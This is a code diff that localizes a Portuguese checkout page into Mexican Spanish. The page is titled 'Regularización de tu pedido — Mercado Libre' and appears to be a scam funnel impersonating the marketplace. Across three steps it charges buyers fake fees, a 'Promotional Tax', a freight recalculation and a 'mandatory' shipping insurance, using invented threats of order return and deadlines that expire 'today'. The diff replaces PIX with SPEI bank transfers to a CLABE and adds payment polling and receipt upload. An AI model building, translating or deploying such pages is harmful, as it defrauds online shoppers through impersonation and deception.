@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="es-MX">
 <head>
 
 <!-- Google tag (gtag.js) -->
@@ -18,7 +18,7 @@
 <script src="/js/utmify-pixel.js"></script><script src="/js/visit-log.js" defer></script>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<title>Regularização do seu pedido — Mercado Livre</title>
+<title>Regularización de tu pedido — Mercado Libre</title>
 <meta name="robots" content="noindex, nofollow">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
@@ -73,68 +73,68 @@
 <body>
 <header>
   <img src="/quiz/images/logo.webp" alt="celimax">
-  <div class="etapa" id="etapa">ETAPA 1 DE 3</div>
+  <div class="etapa" id="etapa">PASO 1 DE 3</div>
 </header>
 <div class="prog"><div id="progbar" style="width:33%"></div></div>
 <div class="wrap">
   <div class="card" id="card"></div>
-  <div class="foot">Processamento seguro via PIX<br>Pagamento processado com segurança</div>
+  <div class="foot">Procesamiento seguro vía SPEI<br>Pago procesado de forma segura</div>
 </div>
 <script>
 const STEPS = {
   '1': {
     key: 'IMP-PROM',
-    amount: 2790,
-    badge: 'PENDÊNCIA FISCAL NO SEU PEDIDO',
+    amount: 9900,
+    badge: 'PENDIENTE FISCAL EN TU PEDIDO',
     badgeColor: '#DC2626',
-    titulo: 'Taxa de Imposto Promocional (TIP)',
-    subtitulo: 'Recolhimento obrigatório para emissão da nota fiscal do seu pedido.',
-    explicacao: 'Seu pagamento foi aprovado, porém o sistema identificou a incidência da Taxa de Imposto Promocional — tributo aplicado sobre produtos vendidos em campanha promocional. Sem esse recolhimento, a nota fiscal do seu pedido não é emitida e a mercadoria fica retida no centro de distribuição.',
+    titulo: 'Tasa de Impuesto Promocional (TIP)',
+    subtitulo: 'Pago obligatorio para la emisión de la factura de tu pedido.',
+    explicacao: 'Tu pago fue aprobado, pero el sistema identificó la incidencia de la Tasa de Impuesto Promocional — tributo aplicado sobre productos vendidos en campaña promocional. Sin este pago, la factura de tu pedido no se emite y la mercancía queda retenida en el centro de distribución.',
     bullets: [
-      'Alíquota promocional reduzida, cobrada uma única vez sobre o pedido.',
-      'Após o pagamento, a nota fiscal é emitida automaticamente em minutos.',
-      'O comprovante fica arquivado junto ao seu pedido para eventual fiscalização.',
+      'Tasa promocional reducida, cobrada por única vez sobre el pedido.',
+      'Tras el pago, la factura se emite automáticamente en minutos.',
+      'El comprobante queda archivado junto a tu pedido para cualquier revisión fiscal.',
     ],
-    aviso: 'Se o imposto não for recolhido, o pedido fica retido no centro de distribuição e é devolvido ao remetente em até 72 horas.',
-    ctaLabel: 'Pagar imposto promocional - R$ 27,90',
+    aviso: 'Si el impuesto no es pagado, el pedido queda retenido en el centro de distribución y se devuelve al remitente en un plazo de hasta 72 horas.',
+    ctaLabel: 'Pagar impuesto promocional - $99',
     next: '2',
-    msgSucesso: 'Imposto recolhido — nota fiscal liberada!'
+    msgSucesso: '¡Impuesto pagado — factura emitida!'
   },
   '2': {
     key: 'FRETE-REC',
-    amount: 1990,
-    badge: 'RECÁLCULO DE FRETE NECESSÁRIO',
+    amount: 6900,
+    badge: 'RECÁLCULO DE ENVÍO NECESARIO',
     badgeColor: '#0f9c74',
-    titulo: 'Recálculo de Frete por Região',
-    subtitulo: 'Complemento obrigatório para a transportadora aceitar a entrega.',
-    explicacao: 'Ao gerar a etiqueta de envio, a transportadora recalculou o frete com base no CEP informado e identificou uma diferença de valor por área de cobertura estendida. Esse complemento precisa ser quitado para que a etiqueta seja aceita e seu pedido siga para a rota de entrega.',
+    titulo: 'Recálculo de Envío por Zona',
+    subtitulo: 'Cargo adicional obligatorio para que la paquetería acepte la entrega.',
+    explicacao: 'Al generar la guía de envío, la paquetería recalculó el costo con base en el código postal proporcionado e identificó una diferencia por zona de cobertura extendida. Este pago adicional debe liquidarse para que la guía sea aceptada y tu pedido continúe en ruta de entrega.',
     bullets: [
-      'Diferença de frete calculada pela própria transportadora, sem margem da loja.',
-      'Após o pagamento, a etiqueta é emitida e o rastreio liberado no mesmo dia.',
-      'Garante entrega no endereço informado, sem redirecionamento para agência.',
+      'Diferencia de envío calculada directamente por la paquetería, sin comisión de la tienda.',
+      'Tras realizar el pago, se genera la guía y se activa el número de rastreo el mismo día.',
+      'Garantiza la entrega en la dirección indicada, sin desvíos a sucursales.',
     ],
-    aviso: 'Sem o complemento de frete, a etiqueta é cancelada e o pedido volta para a fila de expedição, com prazo de entrega indefinido.',
-    ctaLabel: 'Pagar recálculo de frete - R$ 19,90',
+    aviso: 'Sin el pago adicional de envío, la guía se cancela y el pedido regresa a la fila de preparación, con fecha de entrega indefinida.',
+    ctaLabel: 'Pagar recálculo de envío - $69',
     next: '3',
-    msgSucesso: 'Frete quitado — etiqueta de envio emitida!'
+    msgSucesso: '¡Envío pagado — guía de envío generada!'
   },
   '3': {
     key: 'SEG-ENVIO',
-    amount: 1490,
-    badge: 'ÚLTIMA ETAPA - SEGURO DE ENVIO',
+    amount: 4900,
+    badge: 'ÚLTIMA ETAPA - SEGURO DE ENVÍO',
     badgeColor: '#12b886',
-    titulo: 'Taxa Obrigatória de Seguro de Envio',
-    subtitulo: 'Última etapa para liberar seu pedido para postagem hoje.',
-    explicacao: 'Os produtos são enviados em embalagem lacrada com seguro obrigatório contra extravio, violação e avaria. Essa taxa cobre o seguro do transporte e libera seu pedido na expedição prioritária de hoje. Sem ela, o pedido entra na fila padrão de postagem.',
+    titulo: 'Tarifa Obligatoria de Seguro de Envío',
+    subtitulo: 'Último paso para liberar tu pedido y enviarlo hoy mismo.',
+    explicacao: 'Los productos se envían en paquete sellado con seguro obligatorio contra extravío, violación y daños. Esta tarifa cubre el seguro de transporte y libera tu pedido para el despacho prioritario de hoy. Sin ella, el pedido pasa a la fila normal de envío.',
     bullets: [
-      'Cobertura total contra extravio, violação e avaria durante o transporte.',
-      'Reenvio gratuito em caso de qualquer problema na entrega.',
-      'Libera a postagem prioritária ainda hoje, em vez de 3 a 5 dias úteis.',
+      'Cobertura total contra extravío, violación y daños durante el transporte.',
+      'Reenvío gratis ante cualquier inconveniente en la entrega.',
+      'Habilita el envío prioritario hoy mismo, en lugar de 3 a 5 días hábiles.',
     ],
-    aviso: 'A expedição prioritária está disponível apenas hoje. Sem o seguro, o pedido segue sem cobertura e na fila padrão de postagem.',
-    ctaLabel: 'Ativar seguro de envio - R$ 14,90',
+    aviso: 'El despacho prioritario solo está disponible hoy. Sin el seguro, el pedido se procesa sin cobertura y en la fila normal de envío.',
+    ctaLabel: 'Activar seguro de envío - $49',
     next: 'sucesso',
-    msgSucesso: 'Seguro ativado — pedido liberado para postagem!',
+    msgSucesso: '¡Seguro activado — pedido liberado para envío!',
     permitirPular: true
   }
 };
@@ -152,19 +152,19 @@ const emailParam = params.get('email') || (nome.toLowerCase().replace(/[^a-z0-9]
 const phoneParam = (params.get('phone') || '11999999999').replace(/\D/g, '');
 
 const card = document.getElementById('card');
-function fmtBRL(c){return (c/100).toLocaleString('pt-BR',{style:'currency',currency:'BRL'})}
+function fmtBRL(c){return '$' + (c/100).toLocaleString('es-MX',{maximumFractionDigits:0}) + ' MXN'}
 
 function renderIntro(){
   card.innerHTML = `
     <div class="badge" style="background:${cfg.badgeColor}">${cfg.badge}</div>
     <h1>${cfg.titulo}</h1>
     <div class="sub">${cfg.subtitulo}</div>
-    <div class="exp"><strong>Olá, ${primeiroNome}!</strong><br>${cfg.explicacao}</div>
+    <div class="exp"><strong>¡Hola, ${primeiroNome}!</strong><br>${cfg.explicacao}</div>
     <ul class="b">${cfg.bullets.map(b=>`<li><span class="c">✓</span><span>${b}</span></li>`).join('')}</ul>
-    <div class="avs">⚠️ <strong>Atenção:</strong> ${cfg.aviso}</div>
-    <div class="val"><div class="lb">Valor a pagar via PIX:</div><div class="vv">${fmtBRL(cfg.amount)}</div></div>
+    <div class="avs">⚠️ <strong>Atención:</strong> ${cfg.aviso}</div>
+    <div class="val"><div class="lb">Total a pagar por SPEI:</div><div class="vv">${fmtBRL(cfg.amount)}</div></div>
     <button class="btn" id="btn-go">${cfg.ctaLabel}</button>
-    ${cfg.permitirPular ? '<button class="pular" id="btn-skip">Não desejo prosseguir com esta etapa</button>' : ''}
+    ${cfg.permitirPular ? '<button class="pular" id="btn-skip">No deseo continuar con este paso</button>' : ''}
   `;
   document.getElementById('btn-go').addEventListener('click', gerarPix);
   const sk = document.getElementById('btn-skip');
@@ -186,7 +186,7 @@ function stopAll(){ if(tickInt) clearInterval(tickInt); if(pollInt) clearInterva
 
 async function gerarPix(){
   const btn = document.getElementById('btn-go');
-  btn.disabled = true; btn.textContent = 'Gerando PIX...';
+  btn.disabled = true; btn.textContent = 'Generando SPEI...';
   try {
     const res = await fetch('/api/public/freepay-checkout', {
       method: 'POST',
@@ -195,43 +195,42 @@ async function gerarPix(){
         amount: cfg.amount,
         productName: cfg.titulo,
         isUpsell: true,
+        method: 'spei',
         customer: {
           name: nome,
           email: emailParam,
           phone: phoneParam,
-          document: { type: 'cpf', number: cpfRaw }
+          
         },
         items: [{ name: cfg.titulo, price: cfg.amount/100, quantity: 1 }],
         tracking: Object.assign({}, (window.getStoredUtms ? window.getStoredUtms() : {}), (window.fbTracking ? window.fbTracking() : {}))
       })
     });
     const j = await res.json();
-    const pix = j?.data?.pix || j?.pix || {};
-    const copyPaste = pix.copy_paste || pix.qr_code;
-    if (!res.ok || !copyPaste) throw new Error(j?.error || 'Falha ao gerar PIX');
-    let qr = pix.qr_code_base64;
-    if (!qr) qr = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(copyPaste);
-    else if (!String(qr).startsWith('data:')) qr = 'data:image/png;base64,' + qr;
-    renderPix(qr, copyPaste, j?.data?.id || pix.id);
+    const d = j?.data || {};
+    if (!res.ok || !d.clabe) throw new Error(j?.error || 'No pudimos generar tu pago');
+    renderPix(d, d.clabe, d.id);
   } catch(e) {
-    card.innerHTML = `<div class="err"><div style="font-size:40px;margin-bottom:12px">❌</div><div style="font-size:16px;font-weight:700;color:#DC2626;margin-bottom:8px">Não foi possível gerar o PIX</div><div style="font-size:13px;color:#666;margin-bottom:16px">${e.message||''}</div><button class="btn" onclick="location.reload()">Tentar novamente</button></div>`;
+    card.innerHTML = `<div class="err"><div style="font-size:40px;margin-bottom:12px">❌</div><div style="font-size:16px;font-weight:700;color:#DC2626;margin-bottom:8px">No pudimos generar tu pago</div><div style="font-size:13px;color:#666;margin-bottom:16px">${e.message||''}</div><button class="btn" onclick="location.reload()">Intentar de nuevo</button></div>`;
   }
 }
 
 function renderPix(qr, copyPaste, txId){
   card.innerHTML = `
     <div class="pix-box">
-      <div class="badge" style="background:#FEF3C7;color:#78350F">AGUARDANDO PAGAMENTO</div>
-      <div style="font-size:15px;font-weight:700;margin-top:10px">PIX gerado — pague em até</div>
+      <div class="badge" style="background:#FEF3C7;color:#78350F">PAGO PENDIENTE</div>
+      <div style="font-size:15px;font-weight:700;margin-top:10px">Transfiere por SPEI en los próximos</div>
       <div class="pix-timer" id="timer">15:00</div>
-      <img class="qr-img" src="${qr}" alt="QR Code PIX">
-      <div style="font-size:12px;color:#666;margin-top:8px">ou copie o código PIX abaixo:</div>
-      <div class="cp-code">${copyPaste}</div>
-      <button class="cp-btn" id="cp-btn">Copiar código PIX</button>
-      <div class="wait">Aguardando confirmação automática do banco... Não feche esta página.</div>
+      <div style="font-size:13px;color:#444;margin:6px 0">Monto exacto: <strong>${fmtBRL(cfg.amount)}</strong></div>
+      <div style="font-size:12px;color:#666;margin-top:8px">CLABE interbancaria</div>
+      <div class="cp-code" style="font-size:18px;font-weight:700;letter-spacing:1px">${copyPaste}</div>
+      <div style="font-size:12px;color:#666;margin-top:6px">Banco: <strong>${qr.bank_name||'STP'}</strong> · Beneficiario: <strong>${qr.beneficiary||''}</strong></div>
+      <button class="cp-btn" id="cp-btn">Copiar CLABE</button>
+      <div style="text-align:left;font-size:12.5px;color:#444;margin-top:10px;line-height:1.5">1. Copia la CLABE.<br>2. Abre la app de tu banco y elige <strong>Transferir</strong>.<br>3. Agrega la CLABE y envía el monto exacto.<br>4. Se confirma automáticamente en minutos.</div>
+      <div class="wait">Esperando la confirmación de tu pago... No cierres esta página.</div>
       <div class="comp-up hidden" id="comp-up">
-        <p><strong>Já pagou e ainda não foi redirecionado?</strong><br>Anexe seu comprovante abaixo</p>
-        <label for="comp-file">📎 Anexar comprovante</label>
+        <p><strong>¿Ya pagaste y sigues en esta página?</strong><br>Adjunta tu comprobante aquí abajo</p>
+        <label for="comp-file">📎 Adjuntar comprobante</label>
         <input type="file" id="comp-file" accept="image/*,application/pdf">
         <div class="status" id="comp-status"></div>
       </div>
@@ -256,7 +255,7 @@ function renderPix(qr, copyPaste, txId){
 
   pollInt = setInterval(async () => {
     try {
-      const r = await fetch('/api/public/payment-status?gateway=freepay&transaction_id=' + encodeURIComponent(txId));
+      const r = await fetch('/api/public/payment-status?transaction_id=' + encodeURIComponent(txId));
       const j = await r.json();
       if (j?.status === 'paid' || j?.status === 'approved') {
         stopAll();
@@ -273,7 +272,7 @@ function renderPix(qr, copyPaste, txId){
 
 function copyPix(text){
   const btn = document.getElementById('cp-btn');
-  const done = () => { btn.textContent = '✓ Copiado!'; btn.classList.add('ok'); setTimeout(()=>{btn.textContent='Copiar código PIX';btn.classList.remove('ok');},2000); };
+  const done = () => { btn.textContent = '✓ ¡Copiado!'; btn.classList.add('ok'); setTimeout(()=>{btn.textContent='Copiar CLABE';btn.classList.remove('ok');},2000); };
   function fb(){ const ta=document.createElement('textarea');ta.value=text;ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();try{document.execCommand('copy');done();}catch(e){}ta.remove(); }
   if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(done).catch(fb);
   else fb();
@@ -282,14 +281,14 @@ function copyPix(text){
 async function enviarComp(e, txId){
   const f = e.target.files && e.target.files[0]; if (!f) return;
   const st = document.getElementById('comp-status');
-  st.textContent = 'Enviando comprovante...'; st.style.color = '#0f9c74';
+  st.textContent = 'Enviando comprobante...'; st.style.color = '#0f9c74';
   const fd = new FormData(); fd.append('file', f); fd.append('transaction_id', String(txId));
   try {
     const r = await fetch('/api/public/upload-comprovante', { method:'POST', body: fd });
     const j = await r.json();
-    if (j?.success) { st.textContent='✓ Comprovante enviado! Nossa equipe já foi notificada.'; st.style.color='#059669'; }
-    else { st.textContent='Erro ao enviar: '+(j?.message||'tente novamente'); st.style.color='#c0392b'; }
-  } catch(err) { st.textContent='Erro de conexão, tente novamente.'; st.style.color='#c0392b'; }
+    if (j?.success) { st.textContent='✓ ¡Comprobante enviado! Nuestro equipo ya fue notificado.'; st.style.color='#059669'; }
+    else { st.textContent='Error al enviar: '+(j?.message||'intenta de nuevo'); st.style.color='#c0392b'; }
+  } catch(err) { st.textContent='Error de conexión, intenta de nuevo.'; st.style.color='#c0392b'; }
 }
 
 function renderPaid(txId){
